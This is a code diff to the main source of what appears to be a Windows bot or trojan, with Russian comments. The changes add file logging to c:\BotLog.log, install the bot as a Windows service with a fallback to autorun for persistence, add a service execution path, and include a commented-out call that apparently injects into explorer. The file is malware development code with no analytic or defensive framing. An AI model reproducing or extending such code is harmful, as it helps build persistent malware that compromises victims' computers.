@@ -38,6 +38,29 @@ namespace MAINDBGTEMPLATES
 //***************************************************************************
 
 
+
+
+char* LogName = "c:\\BotLog.log";
+
+void WriteLog(const char* Msg)
+{
+	HANDLE H = (HANDLE)pCreateFileA(LogName, GENERIC_WRITE, 0, NULL, OPEN_ALWAYS, 0,NULL);
+	pSetFilePointer(H, 0, 0, FILE_END);
+	DWORD W;
+	string L;
+	L.Format("[%d] %s \r\n", (DWORD)pGetTickCount() / 1000, Msg);
+	pWriteFile(H, L.t_str(), L.Length(), &W, NULL);
+
+//	pWriteFile(H, Msg, strlen(Msg), &W, NULL);
+//	pWriteFile(H, "\r\n", 2, &W, NULL);
+	pCloseHandle(H);
+}
+
+
+
+
+
+
 #pragma comment(linker, "/ENTRY:MyMain" )
 //#pragma comment(linker, "/ENTRY:ExplorerMain" )
 
@@ -77,9 +100,13 @@ void InternalAddToAutorun()
 				return;
 		}
 
-		MDBG("Main", "Добавляем бот в автозагрузку.");
+		
 		PCHAR Name = WSTR::ToAnsi(TempFileName, 0);
-		BOT::AddToAutoRun(Name);
+
+		MDBG("Main", "Добавляем бот в автозагрузку.");
+
+		if (!BOT::InstallService(Name));
+			BOT::AddToAutoRun(Name);
 		STR::Free(Name);
 	}
 	#endif
@@ -240,13 +267,34 @@ int APIENTRY MyMain()
 {
 	BOT::Initialize();
 
+	// Проверяем сервис запущен или нет
+	if (BOT::IsService())
+	{
+		// Если бот ещё не  запущен, то выполняем инжект в эксплорер
+		WriteLog("Запущен сервис");
+
+
+		if (!BOT::IsRunning())
+		{
+			WriteLog("Сервис запускает бота");
+			//JmpToExplorer(ExplorerRoutine);
+		}
+
+		BOT::ExecuteService();
+		pExitProcess(0);
+	}
+
+	WriteLog("Стартует бот");
+	WriteLog(Bot->ApplicationName().t_str());
+
 	// Проверяем не запущен ли на данном компьютере другой экземпляр бота
 	if (BOT::IsRunning())
 	{
+		WriteLog("Бот уже запущен");
 		pExitProcess(0);
-		return 0; // Паранойя :)
 	}
 
+	WriteLog("Запускается бот из автозагрузки");
 
 	DWORD* pVirtualAddr = (DWORD*)MagicValue;
 
